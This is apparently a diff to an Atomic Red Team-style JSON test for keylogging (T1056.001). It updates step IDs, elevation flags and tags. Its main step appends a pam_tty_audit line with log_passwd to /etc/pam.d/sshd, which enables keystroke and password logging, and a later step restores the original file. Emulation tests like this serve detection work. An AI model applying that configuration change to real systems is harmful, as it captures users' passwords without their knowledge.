@@ -7,25 +7,25 @@
   ],
   "steps": [
     {
-      "id": "3cb3b825-8ebe-45b4-aef5-107ad817a5b5",
+      "id": "94d64480-99f5-4f3e-9a9e-96a37f9ac68b",
       "type": "execute-command",
       "data": {
         "command": "cp -v /etc/pam.d/sshd /tmp/\necho \"session required pam_tty_audit.so disable=* enable=* open_only log_passwd\" \u003e\u003e /etc/pam.d/sshd\nsystemctl restart sshd\nsystemctl restart auditd\nssh #{user_account}@localhost \nwhoami\nsudo su\nwhoami\nexit\nexit\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "2a8b809e-3038-47aa-8a36-23fae31abaee",
+      "id": "10430c24-f7b8-4cf8-999d-9655275b4130",
       "type": "execute-command",
       "data": {
         "command": "cp -fv /tmp/sshd /etc/pam.d/\n",
         "command_type": "sh"
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "23aabab7-6729-44c7-ab34-6cfa36f6691f",
+      "id": "94c61a6e-8e90-40dc-9ee9-75c489dda7a6",
       "name": "Check dependency 1/1",
       "description": "This test requires sshd and auditd\n",
       "type": "execute-command",
@@ -33,10 +33,10 @@
         "command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "97896dd9-042c-40d5-a823-2d34e922debb",
+      "id": "94140e84-55bc-48af-b545-e2d9e5870ad7",
       "name": "Resolve dependency 1/1",
       "description": "This test requires sshd and auditd\n",
       "type": "execute-command",
@@ -44,10 +44,10 @@
         "command": "echo \"\"\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     },
     {
-      "id": "341bc35e-15c2-4d35-960c-ba5a95aa01ff",
+      "id": "124353dd-7eb6-4671-8ee8-5d888e6c195b",
       "name": "Re-check dependency 1/1",
       "description": "This test requires sshd and auditd\n",
       "type": "execute-command",
@@ -55,44 +55,44 @@
         "command": "if [ ! -x \"$(command -v sshd)\" ]; then echo -e \"\\n***** sshd NOT installed *****\\n\"; exit 1; fi\nif [ ! -x \"$(command -v auditd)\" ]; then echo -e \"\\n***** auditd NOT installed *****\\n\"; exit 1; fi\n",
         "command_type": ""
       },
-      "elevation_required": false
+      "elevation_required": true
     }
   ],
   "flows": [
     {
-      "s": "3cb3b825-8ebe-45b4-aef5-107ad817a5b5",
+      "s": "94d64480-99f5-4f3e-9a9e-96a37f9ac68b",
       "p": "on-success",
-      "o": "2a8b809e-3038-47aa-8a36-23fae31abaee"
+      "o": "10430c24-f7b8-4cf8-999d-9655275b4130"
     },
     {
-      "s": "3cb3b825-8ebe-45b4-aef5-107ad817a5b5",
+      "s": "94d64480-99f5-4f3e-9a9e-96a37f9ac68b",
       "p": "on-failure",
-      "o": "2a8b809e-3038-47aa-8a36-23fae31abaee"
+      "o": "10430c24-f7b8-4cf8-999d-9655275b4130"
     },
     {
-      "s": "23aabab7-6729-44c7-ab34-6cfa36f6691f",
+      "s": "94c61a6e-8e90-40dc-9ee9-75c489dda7a6",
       "p": "on-success",
-      "o": "3cb3b825-8ebe-45b4-aef5-107ad817a5b5"
+      "o": "94d64480-99f5-4f3e-9a9e-96a37f9ac68b"
     },
     {
-      "s": "23aabab7-6729-44c7-ab34-6cfa36f6691f",
+      "s": "94c61a6e-8e90-40dc-9ee9-75c489dda7a6",
       "p": "on-failure",
-      "o": "97896dd9-042c-40d5-a823-2d34e922debb"
+      "o": "94140e84-55bc-48af-b545-e2d9e5870ad7"
     },
     {
-      "s": "97896dd9-042c-40d5-a823-2d34e922debb",
+      "s": "94140e84-55bc-48af-b545-e2d9e5870ad7",
       "p": "on-success",
-      "o": "341bc35e-15c2-4d35-960c-ba5a95aa01ff"
+      "o": "124353dd-7eb6-4671-8ee8-5d888e6c195b"
     },
     {
-      "s": "341bc35e-15c2-4d35-960c-ba5a95aa01ff",
+      "s": "124353dd-7eb6-4671-8ee8-5d888e6c195b",
       "p": "on-failure",
-      "o": "3cb3b825-8ebe-45b4-aef5-107ad817a5b5"
+      "o": "94d64480-99f5-4f3e-9a9e-96a37f9ac68b"
     }
   ],
   "tags": [
-    "T1056.001",
-    "atomic-red-team"
+    "T1056",
+    "T1056.001"
   ],
   "input_arguments": [
     {
